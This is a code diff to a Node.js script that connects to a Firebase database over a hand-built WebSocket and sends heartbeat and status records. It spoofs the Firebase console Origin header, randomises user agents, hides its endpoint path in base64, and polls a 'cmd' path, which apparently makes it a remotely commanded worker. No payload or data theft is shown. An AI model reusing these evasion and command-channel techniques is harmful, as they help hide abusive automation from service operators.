@@ -80,8 +80,10 @@ async function runWebSocket(url) {
     let socket = tls.connect({ host, port, servername: host }, () => {
         socket.write(`GET ${path} HTTP/1.1\r\nHost: ${host}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: ${randomWebSocketKey()}\r\nSec-WebSocket-Version: 13\r\nOrigin: https://console.firebase.google.com\r\nUser-Agent: ${randomUserAgent()}\r\n\r\n`);
         sendWSMessage(socket, JSON.stringify({"t":"d","d":{"r":id++,"a":"om","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}, "s":0}}}}))
+        sendWSMessage(socket, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}, "s":1}}}}))
         sendWSMessage(socket, JSON.stringify({"t":"d","d":{"r":id++,"a":"q","b":{"p":cmd,"h":""}}}))
         CONNECTION = socket
+        console.log('Node: ---SOCKET-CONNECTION-OPEN---')
     })
 
     socket.on('data', (data) => {
@@ -136,6 +138,7 @@ async function runWebSocket(url) {
     
     socket.on('end', () => {
         CONNECTION = null
+        console.log('Node: ---SOCKET-CONNECTION-CLOSE---')
         setTimeout(async () => {
             await runWebSocket(url)
         }, 3000)
@@ -145,6 +148,13 @@ async function runWebSocket(url) {
         CONNECTION = null
         socket.destroy()
     })
+
+    for (let i = 0; i < 30; i++) {
+        if (CONNECTION) {
+            break
+        }
+        await delay(1000)
+    }
 }
 
 function sendWSMessage(socket, message) {
@@ -206,9 +216,9 @@ function sendPing(socket) {
 async function checkStatus() {
     if (FINISH > 0 && FINISH < new Date().getTime()) {
         
-        if (!sendWSMessage(CONNECTION, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}, "s":0}}}}))) {
+        if (!sendWSMessage(CONNECTION, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}}}}}))) {
             try {
-                await patchFetch('https://'+DATABASE+decode('LmZpcmViYXNlaW8uY29tLyVDMiVBM3VjayVFMyU4MCU4NXlvdS91c2VyLw==')+USER+'.json', { "t": Date.now(), "s":0 }, {
+                await patchFetch('https://'+DATABASE+decode('LmZpcmViYXNlaW8uY29tLyVDMiVBM3VjayVFMyU4MCU4NXlvdS91c2VyLw==')+USER+'.json', { "t": Date.now() }, {
                     'Content-Type': 'application/json'
                 })
             } catch (error) {}
@@ -217,9 +227,9 @@ async function checkStatus() {
         console.log('---COMPLETED---')
         process.exit(0)
     } else {
-        if (!sendWSMessage(CONNECTION, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}, "s":1}}}}))) {
+        if (!sendWSMessage(CONNECTION, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}}}}}))) {
             try {
-                await patchFetch('https://'+DATABASE+decode('LmZpcmViYXNlaW8uY29tLyVDMiVBM3VjayVFMyU4MCU4NXlvdS91c2VyLw==')+USER+'.json', { "t": Date.now(), "s":1 }, {
+                await patchFetch('https://'+DATABASE+decode('LmZpcmViYXNlaW8uY29tLyVDMiVBM3VjayVFMyU4MCU4NXlvdS91c2VyLw==')+USER+'.json', { "t": Date.now() }, {
                     'Content-Type': 'application/json'
                 })
             } catch (error) {}
